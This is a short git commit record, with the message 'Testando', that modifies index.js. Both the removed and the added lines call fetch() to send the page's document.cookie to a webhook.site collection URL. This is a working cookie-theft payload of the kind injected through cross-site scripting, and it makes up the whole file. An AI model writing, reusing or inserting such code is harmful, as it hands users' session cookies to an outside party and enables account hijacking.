b92532a74ddce2795cc99ee14e5323183b4f437d
ek1l <hintl3rgames2015@gmail.com>
2025-08-06 12:28:19 -0300

    Testando

--- index.js
+++ index.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/a7f7e9dd-d925-450b-a629-d69d8fd68920?data=' + document.cookie)
+fetch(
+  'https://webhook.site/a7f7e9dd-d925-450b-a629-d69d8fd68920' + document.cookie,
+);
